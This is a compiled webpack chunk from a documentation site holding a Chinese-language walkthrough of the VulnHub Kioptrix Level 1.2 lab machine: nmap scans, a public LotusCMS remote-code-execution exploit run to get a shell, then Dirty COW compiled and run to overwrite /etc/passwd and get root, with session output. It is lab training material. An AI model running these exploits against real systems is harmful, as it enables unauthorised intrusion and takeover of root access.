"use strict";(self.webpackChunkremote_website=self.webpackChunkremote_website||[]).push([[4686],{4329:(e,n,r)=>{r.r(n),r.d(n,{assets:()=>c,contentTitle:()=>o,default:()=>p,frontMatter:()=>a,metadata:()=>t,toc:()=>l});const t=JSON.parse('{"id":"VulnHub/Virtual Machines/Kioptrix Level 1.2","title":"Kioptrix Level 1.2","description":"\u7aef\u53e3\u626b\u63cf","source":"@site/docs/VulnHub/Virtual Machines/Kioptrix Level 1.2.md","sourceDirName":"VulnHub/Virtual Machines","slug":"/VulnHub/Virtual Machines/Kioptrix Level 1.2","permalink":"/docs/VulnHub/Virtual Machines/Kioptrix Level 1.2","draft":false,"unlisted":false,"editUrl":"https://github.com/C0rr3c7/C0rr3c7.github.io/tree/master/docs/VulnHub/Virtual Machines/Kioptrix Level 1.2.md","tags":[],"version":"current","frontMatter":{},"sidebar":"VulnHubSidebar","previous":{"title":"Kioptrix Level 1.1","permalink":"/docs/VulnHub/Virtual Machines/Kioptrix Level 1.1"},"next":{"title":"Kioptrix Level 1.3","permalink":"/docs/VulnHub/Virtual Machines/Kioptrix Level 1.3"}}');var i=r(4848),s=r(8453);const a={},o=void 0,c={},l=[{value:"\u7aef\u53e3\u626b\u63cf",id:"\u7aef\u53e3\u626b\u63cf",level:3},{value:"web\u6e17\u900f",id:"web\u6e17\u900f",level:3},{value:"\u5185\u6838\u63d0\u6743",id:"\u5185\u6838\u63d0\u6743",level:3}];function d(e){const n={a:"a",code:"code",h3:"h3",img:"img",p:"p",pre:"pre",...(0,s.R)(),...e.components};return(0,i.jsxs)(i.Fragment,{children:[(0,i.jsx)(n.h3,{id:"\u7aef\u53e3\u626b\u63cf",children:"\u7aef\u53e3\u626b\u63cf"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"# Nmap 7.94SVN scan initiated Tue Nov  5 04:07:39 2024 as: nmap -sT --min-rate 10000 -p- -oA nmapscan/port_scan 192.168.217.141\r\nNmap scan report for kioptrix3.com (192.168.217.141)\r\nHost is up (0.0051s latency).\r\nNot shown: 65533 closed tcp ports (conn-refused)\r\nPORT   STATE SERVICE\r\n22/tcp open  ssh\r\n80/tcp open  http\r\nMAC Address: 00:0C:29:6B:AA:CF (VMware)\n"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"# Nmap 7.94SVN scan initiated Tue Nov  5 04:09:00 2024 as: nmap -sT -sV -sC -O -p22,80 -oA nmapscan/detail_scan 192.168.217.141\r\nNmap scan report for kioptrix3.com (192.168.217.141)\r\nHost is up (0.00072s latency).\r\n\r\nPORT   STATE SERVICE VERSION\r\n22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)\r\n| ssh-hostkey: \r\n|   1024 30:e3:f6:dc:2e:22:5d:17:ac:46:02:39:ad:71:cb:49 (DSA)\r\n|_  2048 9a:82:e6:96:e4:7e:d6:a6:d7:45:44:cb:19:aa:ec:dd (RSA)\r\n80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)\r\n|_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch\r\n|_http-title: Ligoat Security - Got Goat? Security ...\r\n| http-cookie-flags: \r\n|   /: \r\n|     PHPSESSID: \r\n|_      httponly flag not set\r\nMAC Address: 00:0C:29:6B:AA:CF (VMware)\r\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\r\nDevice type: general purpose\r\nRunning: Linux 2.6.X\r\nOS CPE: cpe:/o:linux:linux_kernel:2.6\r\nOS details: Linux 2.6.9 - 2.6.33\r\nNetwork Distance: 1 hop\r\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n"})}),"\n",(0,i.jsxs)(n.p,{children:[(0,i.jsx)(n.code,{children:"OS details: Linux 2.6.9 - 2.6.33"}),"\u53ef\u4ee5\u4f7f\u7528\u810f\u725b\u63d0\u6743"]}),"\n",(0,i.jsx)(n.h3,{id:"web\u6e17\u900f",children:"web\u6e17\u900f"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241105215036083.png",alt:"image-20241105215036083"})}),"\n",(0,i.jsxs)(n.p,{children:["\u8001CMS\u4e86\uff0c\u627e\u5386\u53f2\u6f0f\u6d1e ",(0,i.jsx)(n.code,{children:" LotusCMS"})]}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.a,{href:"https://github.com/Hood3dRob1n/LotusCMS-Exploit/",children:"https://github.com/Hood3dRob1n/LotusCMS-Exploit/"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"/lotusRCE.sh 192.168.217.141 /\n"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241105215914078.png",alt:"image-20241105215914078"})}),"\n",(0,i.jsx)(n.p,{children:"\u62ff\u5230shell"}),"\n",(0,i.jsx)(n.h3,{id:"\u5185\u6838\u63d0\u6743",children:"\u5185\u6838\u63d0\u6743"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{children:"searchsploit -m 40839\n"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{children:'// To use this exploit modify the user values according to your needs.\r\n//   The default is "firefart".\r\n//\r\n// Original exploit (dirtycow\'s ptrace_pokedata "pokemon" method):\r\n//   https://github.com/dirtycow/dirtycow.github.io/blob/master/pokemon.c\r\n//\r\n// Compile with:\r\n//   gcc -pthread dirty.c -o dirty -lcrypt\r\n//\r\n// Then run the newly create binary by either doing:\r\n//   "./dirty" or "./dirty my-new-password"\r\n//\r\n// Afterwards, you can either "su firefart" or "ssh firefart@..."\r\n//\r\n// DON\'T FORGET TO RESTORE YOUR /etc/passwd AFTER RUNNING THE EXPLOIT!\r\n//   mv /tmp/passwd.bak /etc/passwd\n'})}),"\n",(0,i.jsx)(n.p,{children:"\u7f16\u8bd1\u53c2\u6570"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"gcc -pthread dirty.c -o dirty -lcrypt\n"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"www-data@Kioptrix3:/tmp$ ./ditty \r\n./ditty\r\nbash: ./ditty: No such file or directory\r\nwww-data@Kioptrix3:/tmp$ ./dirty \r\n./dirty\r\n/etc/passwd successfully backed up to /tmp/passwd.bak\r\nPlease enter the new password: 123456\r\n\r\nComplete line:\r\nfirefart:fi8RL.Us0cfSs:0:0:pwned:/root:/bin/bash\r\nwww-data@Kioptrix3:/tmp$ su \r\nsu\r\nPassword: 123456\r\n\r\nfirefart@Kioptrix3:/tmp# id\r\nid\r\nuid=0(firefart) gid=0(root) groups=0(root)\r\nfirefart@Kioptrix3:/tmp# whoami\r\nwhoami\r\nfirefart\n"})}),"\n",(0,i.jsx)(n.p,{children:"\u63d0\u6743\u6210\u529f"})]})}function p(e={}){const{wrapper:n}={...(0,s.R)(),...e.components};return n?(0,i.jsx)(n,{...e,children:(0,i.jsx)(d,{...e})}):d(e)}},8453:(e,n,r)=>{r.d(n,{R:()=>a,x:()=>o});var t=r(6540);const i={},s=t.createContext(i);function a(e){const n=t.useContext(s);return t.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function o(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(i):e.components||i:a(e.components),t.createElement(s.Provider,{value:n},e.children)}}}]);